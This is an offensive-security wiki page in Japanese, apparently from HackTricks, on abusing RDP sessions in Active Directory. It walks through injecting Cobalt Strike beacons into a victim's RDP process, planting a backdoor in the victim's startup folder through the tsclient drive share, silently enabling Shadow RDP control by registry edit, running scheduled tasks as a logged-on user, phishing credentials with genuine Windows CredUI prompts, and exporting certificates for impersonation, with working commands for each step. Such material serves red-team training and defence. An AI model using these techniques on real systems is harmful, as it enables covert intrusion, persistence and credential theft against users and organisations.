# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

**external group** が現在のドメイン内のいずれかの**computer**への**RDP access**を持っている場合、**attacker**はその**computer**を**compromise**して、そのユーザーを待ち受けることができます。

そのユーザーがRDP経由でアクセスすると、**attacker**はそのユーザーのセッションに**pivot**し、external domain内でそのユーザーの権限を**abuse**できます。
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
**他の tools を使って session を steal する別の方法**については、[**このページを確認してください。**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

ユーザーが、**attacker** が待ち構えているマシンに **RDP でアクセス**すると、attacker は **ユーザーの RDP session に beacon を inject**でき、さらに被害者が RDP でアクセスする際に **自分の drive を mount**していた場合、**attacker はそれにアクセスできます**。

この場合、**statup folder** に **backdoor** を書き込むだけで、**被害者**の **元の computer**を **compromise**できます。
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

**local admin** として、被害者がすでに **active RDP session** を持っているホスト上にいる場合、**password の窃取や LSASS のダンプを行わずに、そのデスクトップを表示・操作できる**可能性があります。<sup>[[1]](#references)</sup>

これは、以下に保存されている **Remote Desktop Services shadowing** ポリシーに依存します。<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
興味深い値:

- `0`: 無効
- `1`: `EnableInputNotify`（操作可能、ユーザーの承認が必要）
- `2`: `EnableInputNoNotify`（操作可能、**ユーザーの承認は不要**）
- `3`: `EnableNoInputNotify`（閲覧のみ、ユーザーの承認が必要）
- `4`: `EnableNoInputNoNotify`（閲覧のみ、**ユーザーの承認は不要**）
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
これは、特権ユーザーがRDP経由で接続したまま、ロックされていないデスクトップ、KeePass session、MMC console、browser session、または admin shell を開いたままにしていた場合に特に有効です。

## ログオンユーザーとしての Scheduled Tasks

あなたが**local admin**で、対象ユーザーが**現在ログオン中**の場合、Task Schedulerはそのユーザーのパスワードなしで、そのユーザーとしてコードを起動できます。<sup>[[1]](#references)[[4]](#references)</sup>

これにより、被害者の既存のログオンセッションを実行プリミティブとして利用できます：
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
注意事項:

- ユーザーが**ログオンしていない**場合、Windows は通常、そのユーザーとして実行される task を作成するためにパスワードを要求します。
- ユーザーが**ログオンしている**場合、task は既存のログオンコンテキストを再利用できます。
- これは、LSASS に触れることなく、被害者セッション内で GUI 操作を実行したり、バイナリを起動したりする実用的な方法です。

## 被害者セッションからの CredUI Prompt Abuse

**Shadow RDP** や、**そのユーザーとして実行される scheduled task** などを介して、**被害者の interactive desktop 内で実行**できるようになると、CredUI API を使用して**本物の Windows credential prompt**を表示し、被害者が入力した credentials を取得できます。<sup>[[1]](#references)</sup>

関連する API:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

一般的な flow:

1. 被害者セッション内でバイナリを起動します。
2. 現在の domain の branding に一致する domain-authentication prompt を表示します。
3. 返された auth buffer を unpack します。
4. 提供された credentials を検証し、有効な credentials が入力されるまで prompt を繰り返すこともできます。

これは、偽の HTML form ではなく標準の Windows API によって prompt が描画されるため、**on-host phishing** に有用です。

## 被害者コンテキストでの PFX の要求

同じ **scheduled-task-as-user** primitive を使用して、ログオン中の被害者として **certificate/PFX** を要求できます。その certificate は後で、そのユーザーとして **AD authentication** に使用できるため、password の窃取を完全に回避できます。<sup>[[1]](#references)[[5]](#references)</sup>

High-level flow:

1. 被害者がログオンしている host で **local admin** を取得します。
2. **scheduled task** を使用して、被害者として enrollment/export logic を実行します。
3. 生成された **PFX** を export します。
4. PFX を PKINIT / certificate-based AD authentication に使用します。

追加の abuse については AD CS のページを参照してください:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - flat network から tiering model による locked-up domain へ](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - scheduled task を介した PFX の要求 PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
